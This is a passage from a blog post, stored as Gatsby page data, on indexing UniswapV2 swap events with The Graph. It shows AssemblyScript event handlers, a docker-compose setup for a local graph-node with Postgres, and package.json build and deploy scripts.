<span class=\"token string\">\"RECEIVE\"</span>\n  log<span class=\"token punctuation\">.</span>createAt <span class=\"token operator\">=</span> event<span class=\"token punctuation\">.</span>block<span class=\"token punctuation\">.</span>timestamp\n  log<span class=\"token punctuation\">.</span>tx <span class=\"token operator\">=</span> event<span class=\"token punctuation\">.</span>transaction<span class=\"token punctuation\">.</span>hash<span class=\"token punctuation\">.</span><span class=\"token function\">toHex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n  log<span class=\"token punctuation\">.</span><span class=\"token function\">save</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n  <span class=\"token function\">evtHistoryPush</span><span class=\"token punctuation\">(</span>IDs<span class=\"token punctuation\">,</span> log<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">function</span> <span class=\"token function\">handleSwap</span><span class=\"token punctuation\">(</span>event<span class=\"token operator\">:</span> EvtSwap<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token keyword\">void</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">let</span> entity <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Swap</span><span class=\"token punctuation\">(</span>\n    <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>event<span class=\"token punctuation\">.</span>transaction<span class=\"token punctuation\">.</span>hash<span class=\"token punctuation\">.</span><span class=\"token function\">toHex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">-</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>event<span class=\"token punctuation\">.</span>logIndex<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span>\n  <span class=\"token punctuation\">)</span>\n  entity<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">=</span> event<span class=\"token punctuation\">.</span>params<span class=\"token punctuation\">.</span>sender\n  entity<span class=\"token punctuation\">.</span>recipient <span class=\"token operator\">=</span> event<span class=\"token punctuation\">.</span>params<span class=\"token punctuation\">.</span>recipient\n  entity<span class=\"token punctuation\">.</span>srcToken <span class=\"token operator\">=</span> event<span class=\"token punctuation\">.</span>params<span class=\"token punctuation\">.</span>srcToken\n  entity<span class=\"token punctuation\">.</span>destToken <span class=\"token operator\">=</span> event<span class=\"token punctuation\">.</span>params<span class=\"token punctuation\">.</span>destToken\n  entity<span class=\"token punctuation\">.</span>expectedAmount <span class=\"token operator\">=</span> event<span class=\"token punctuation\">.</span>params<span class=\"token punctuation\">.</span>expectedAmount\n  entity<span class=\"token punctuation\">.</span>receivedAmount <span class=\"token operator\">=</span> event<span class=\"token punctuation\">.</span>params<span class=\"token punctuation\">.</span>receivedAmount\n  entity<span class=\"token punctuation\">.</span>percent <span class=\"token operator\">=</span> event<span class=\"token punctuation\">.</span>params<span class=\"token punctuation\">.</span>percent\n  entity<span class=\"token punctuation\">.</span><span class=\"token function\">save</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n  <span class=\"token function\">logSwap</span><span class=\"token punctuation\">(</span>entity<span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">,</span> event<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">function</span> <span class=\"token function\">logSwap</span><span class=\"token punctuation\">(</span>IDs<span class=\"token operator\">:</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span> event<span class=\"token operator\">:</span> EvtSwap<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token keyword\">void</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">let</span> log <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Log</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>event<span class=\"token punctuation\">.</span>transaction<span class=\"token punctuation\">.</span>hash<span class=\"token punctuation\">.</span><span class=\"token function\">toHex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">-</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>event<span class=\"token punctuation\">.</span>logIndex<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span>\n\n  log<span class=\"token punctuation\">.</span>logType <span class=\"token operator\">=</span> <span class=\"token string\">\"SWAP\"</span>\n  log<span class=\"token punctuation\">.</span>createAt <span class=\"token operator\">=</span> event<span class=\"token punctuation\">.</span>block<span class=\"token punctuation\">.</span>timestamp\n  log<span class=\"token punctuation\">.</span>tx <span class=\"token operator\">=</span> event<span class=\"token punctuation\">.</span>transaction<span class=\"token punctuation\">.</span>hash<span class=\"token punctuation\">.</span><span class=\"token function\">toHex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n  log<span class=\"token punctuation\">.</span><span class=\"token function\">save</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n  <span class=\"token function\">evtHistoryPush</span><span class=\"token punctuation\">(</span>IDs<span class=\"token punctuation\">,</span> log<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>After allocating each value to the instance implemented as entity, finally complete <code class=\"language-text\">save</code>.</li>\n<li>Here, log functions attached as prefix are added as a separate logging role to extract time and hash information generated in a separate transaction.</li>\n</ul>\n<h3 id=\"graph-build-task\" style=\"position:relative;\"><a href=\"#graph-build-task\" aria-label=\"graph build task permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Graph build task</h3>\n<ul>\n<li>If you have completed up to this point, you should proceed with the final build to prepare for event connection.</li>\n<li>Proceed with the build through the <code class=\"language-text\">graph build</code> command.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 107.22222222222221%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAVCAYAAABG1c6oAAAACXBIWXMAABYlAAAWJQFJUiTwAAABu0lEQVQ4y51UWW/DIBjjCLk4AknVJE26p2n7/7/Qk5nY+jCpdA+WAVWuv8MRc5qRERNa00JrDa00lFb53DTN95vWEEI8R9/3iCkihIAwBSzLgnmeEWOE9x7TNGUmlFIVgl2fxay1cM5lAd4pUN7IRJXL0Y6IU8xC4ziCjruuwzAMmXlv2zYzy38qGJeI8zxxHAcul0sWZrkUkVLW9e0R1tmfnlGMzkqZdExhOjXG1P2Bn3x2RlH2jkPhnT2k2MsO4yXifr9j2zes64rjPHC9XpFSyo6rJvuItCS8nW+47Tes1xW3bc893bYtl/xyHxvbwDgDYw2asUEXOrRdCyXV6+USxipoq9E4AzUoCCMgpPifGLHfd5yfJ24f75jmCKEERm/rdu7PKfuQB8CpcnnZN65OWfDCRFU/uRrO/8arRK/sYWGiauJDP/x8ALjQJcfkcifzraoNIQXs+553kGkpgiyb6WAFFOK5yqELLiejpKPErogUVA+JWaYzDoZCZTA8cxAUeikt1tssxgyTmemSa4pXfxQKpJMQVoCsGgupPaQOEMpCiJE/gJAWQvlviCelBzfA5U+8+/8yP+ALQr2+F+3k+TgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"codegen.png\"\n        title=\"codegen.png\"\n        src=\"/static/e0f19a1447510bcbdf9703ec4b4fcbe6/37523/graph-codegen.png\"\n        srcset=\"/static/e0f19a1447510bcbdf9703ec4b4fcbe6/e9ff0/graph-codegen.png 180w,\n/static/e0f19a1447510bcbdf9703ec4b4fcbe6/f21e7/graph-codegen.png 360w,\n/static/e0f19a1447510bcbdf9703ec4b4fcbe6/37523/graph-codegen.png 720w,\n/static/e0f19a1447510bcbdf9703ec4b4fcbe6/302a4/graph-codegen.png 1080w,\n/static/e0f19a1447510bcbdf9703ec4b4fcbe6/07a9c/graph-codegen.png 1440w,\n/static/e0f19a1447510bcbdf9703ec4b4fcbe6/9f9a4/graph-codegen.png 1560w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"graph-node-setup\" style=\"position:relative;\"><a href=\"#graph-node-setup\" aria-label=\"graph node setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Graph-Node Setup</h3>\n<ul>\n<li>After deploying Subgraph, you need to configure the following to run the node for each data management locally.</li>\n</ul>\n<p><a href=\"https://github.com/graphprotocol/graph-node\">https://github.com/graphprotocol/graph-node</a></p>\n<blockquote>\n<p>Graph-Node</p>\n<p><a href=\"https://thegraph.com/\">The Graph</a> is a protocol for building decentralized applications (dApps) quickly on Ethereum and IPFS using GraphQL.</p>\n<p>Graph Node is an open source Rust implementation that\nevent sources the Ethereum blockchain to deterministically update a data\nstore that can be queried via the GraphQL endpoint.</p>\n<p>For detailed instructions and more context, check out the <a href=\"https://github.com/graphprotocol/graph-node/blob/master/docs/getting-started.md\">Getting Started Guide</a>.</p>\n</blockquote>\n<ul>\n<li>You can set up the relevant settings by referring to the following, but there are parts that need to be set up for each project.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"yaml\"><pre class=\"language-yaml\"><code class=\"language-yaml\"><span class=\"token key atrule\">version</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'3'</span>\n<span class=\"token key atrule\">services</span><span class=\"token punctuation\">:</span>\n  <span class=\"token key atrule\">graph-node</span><span class=\"token punctuation\">:</span>\n    <span class=\"token key atrule\">image</span><span class=\"token punctuation\">:</span> graphprotocol/graph<span class=\"token punctuation\">-</span>node\n    <span class=\"token key atrule\">ports</span><span class=\"token punctuation\">:</span>\n      <span class=\"token punctuation\">-</span> <span class=\"token string\">'8000:8000'</span>\n      <span class=\"token punctuation\">-</span> <span class=\"token string\">'8001:8001'</span>\n      <span class=\"token punctuation\">-</span> <span class=\"token string\">'8020:8020'</span>\n      <span class=\"token punctuation\">-</span> <span class=\"token string\">'8030:8030'</span>\n      <span class=\"token punctuation\">-</span> <span class=\"token string\">'8040:8040'</span>\n    <span class=\"token key atrule\">depends_on</span><span class=\"token punctuation\">:</span>\n      <span class=\"token punctuation\">-</span> postgres\n    <span class=\"token key atrule\">extra_hosts</span><span class=\"token punctuation\">:</span>\n      <span class=\"token punctuation\">-</span> 172.19.0.1<span class=\"token punctuation\">:</span>host<span class=\"token punctuation\">-</span>gateway\n    <span class=\"token key atrule\">environment</span><span class=\"token punctuation\">:</span>\n      <span class=\"token key atrule\">postgres_host</span><span class=\"token punctuation\">:</span> postgres\n      <span class=\"token key atrule\">postgres_user</span><span class=\"token punctuation\">:</span> graph<span class=\"token punctuation\">-</span>node\n      <span class=\"token key atrule\">postgres_pass</span><span class=\"token punctuation\">:</span> let<span class=\"token punctuation\">-</span>me<span class=\"token punctuation\">-</span>in\n      <span class=\"token key atrule\">postgres_db</span><span class=\"token punctuation\">:</span> graph<span class=\"token punctuation\">-</span>node\n      <span class=\"token key atrule\">ipfs</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'https://ipfs.io'</span>\n      <span class=\"token key atrule\">ethereum</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'rinkeby:https://rinkeby.infura.io/v3/8c6f778de9a94b6e9ebc0481745ad286'</span>\n      <span class=\"token key atrule\">GRAPH_LOG</span><span class=\"token punctuation\">:</span> info\n      <span class=\"token key atrule\">GRAPH_ALLOW_NON_DETERMINISTIC_FULLTEXT_SEARCH</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'true'</span>\n      <span class=\"token key atrule\">GRAPH_ALLOW_NON_DETERMINISTIC_IPFS</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'true'</span>\n  <span class=\"token key atrule\">postgres</span><span class=\"token punctuation\">:</span>\n    <span class=\"token key atrule\">image</span><span class=\"token punctuation\">:</span> postgres\n    <span class=\"token key atrule\">ports</span><span class=\"token punctuation\">:</span>\n      <span class=\"token punctuation\">-</span> <span class=\"token string\">'5432:5432'</span>\n    <span class=\"token key atrule\">command</span><span class=\"token punctuation\">:</span>\n      <span class=\"token punctuation\">[</span>\n        <span class=\"token string\">\"postgres\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"-cshared_preload_libraries=pg_stat_statements\"</span>\n      <span class=\"token punctuation\">]</span>\n    <span class=\"token key atrule\">environment</span><span class=\"token punctuation\">:</span>\n      <span class=\"token key atrule\">POSTGRES_USER</span><span class=\"token punctuation\">:</span> graph<span class=\"token punctuation\">-</span>node\n      <span class=\"token key atrule\">POSTGRES_PASSWORD</span><span class=\"token punctuation\">:</span> let<span class=\"token punctuation\">-</span>me<span class=\"token punctuation\">-</span>in\n      <span class=\"token key atrule\">POSTGRES_DB</span><span class=\"token punctuation\">:</span> graph<span class=\"token punctuation\">-</span>node\n      <span class=\"token key atrule\">PGDATA</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"/data/postgres\"</span>\n    <span class=\"token key atrule\">volumes</span><span class=\"token punctuation\">:</span>\n      <span class=\"token punctuation\">-</span> ./data/postgres<span class=\"token punctuation\">:</span>/var/lib/postgresql/data</code></pre></div>\n<h3 id=\"subgraph-studio-deploy\" style=\"position:relative;\"><a href=\"#subgraph-studio-deploy\" aria-label=\"subgraph studio deploy permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Subgraph Studio Deploy</h3>\n<ul>\n<li>After completing the build, proceed with deployment. This is the currently defined <code class=\"language-text\">package.json</code>, and I use the <code class=\"language-text\">deploy-local</code> command because I plan to run my own <code class=\"language-text\">graph-node</code> locally to work.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\"><span class=\"token punctuation\">{</span>\n  <span class=\"token property\">\"name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Uniswap\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token property\">\"license\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"UNLICENSED\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token property\">\"scripts\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token property\">\"codegen\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"graph codegen\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"build\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"graph build\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"deploy\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"graph deploy --node https://api.studio.thegraph.com/deploy/ Uniswap\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"create-local\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"graph create --node http://localhost:8020/ Uniswap\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"remove-local\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"graph remove --node http://localhost:8020/ Uniswap\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"deploy-local\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"graph deploy --node http://localhost:8020/ --ipfs http://localhost:5001 Uniswap\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"test\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"graph test\"</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token property\">\"dependencies\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token property\">\"@graphprotocol/graph-cli\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"0.33.0\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"@graphprotocol/graph-ts\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"0.27.0\"</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token property\">\"devDependencies\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token property\">\"matchstick-as\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"0.5.0\"</span> <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>When initializing is performed, the following command sequence shows the next call sequence. If you modify the code, you do not need to call <code class=\"language-text\">graph create</code> and proceed in order.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">> graph codegen\n> graph build\n> graph create --node http<span class=\"token operator\">:</span><span class=\"token comment\">//localhost:8020/ Uniswap</span>\n> graph deploy --node http<span class=\"token operator\">:</span><span class=\"token comment\">//localhost:8020/ --ipfs http://localhost:5001 Uniswap</span></code></pre></div>\n<ul>\n<li>When it is finally completed, it is possible to collect data by sending a sequence from the node and querying the events that occur in the transaction.</li>\n<li><a href=\"https://thegraph.com/studio/\">https://thegraph.com/studio/</a>\n<ul>\n<li>\n<p>Create subgraph</p>\n<p><a href=\"https://thegraph.com/studio/subgraph/nftmarket/\">Subgraph Studio</a></p>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"uniswap-contract-code\" style=\"position:relative;\"><a href=\"#uniswap-contract-code\" aria-label=\"uniswap contract code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Uniswap Contract Code</h3>\n<ul>\n<li>Github RP:  <a href=\"https://github.com/dnsdudrla97/unswap-contract\">https://github.com/dnsdudrla97/unswap-contract</a></li>\n<li>Github Graph: <a href=\"https://github.com/dnsdudrla97/unswap-contract-subgraph\">https://github.com/dnsdudrla97/unswap-contract-subgraph</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#subgraph\">SubGraph</a></p>\n</li>\n<li>\n<p><a href=\"#bored-ape-yacht-club\">Bored Ape Yacht Club</a></p>\n<ul>\n<li><a href=\"#how-graphs-work\">How Graphs Work</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#graph-cli-install\">Graph CLI install</a></p>\n</li>\n<li>\n<p><a href=\"#subgraph-init\">subgraph init</a></p>\n</li>\n<li>\n<p><a href=\"#subgraph-writer\">subgraph writer</a></p>\n<ul>\n<li><a href=\"#contract-event-data-query-matching-operation\">Contract Event data query matching operation</a></li>\n<li><a href=\"#graphql-schema-handling-work-in-progress\">GraphQL schema handling work in progress</a></li>\n<li><a href=\"#graph-build-task\">Graph build task</a></li>\n<li><a href=\"#graph-node-setup\">Graph-Node Setup</a></li>\n<li><a href=\"#subgraph-studio-deploy\">Subgraph Studio Deploy</a></li>\n<li><a href=\"#uniswap-contract-code\">Uniswap Contract Code</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"August 04, 2022","title":"UniswapV2 Smart Contract Subgraph event query","categories":"Blockchain","author":"Zer0Luck","emoji":"🦄"},"fields":{"slug":"/uniswap-contract-event-graph/"}},"site":{"siteMetadata":{"siteUrl":"https://zer0luck.kr","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/uniswap-contract/","nextSlug":"/defi-wargame-6/","prevSlug":"/uniswap-contract-event-graph/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}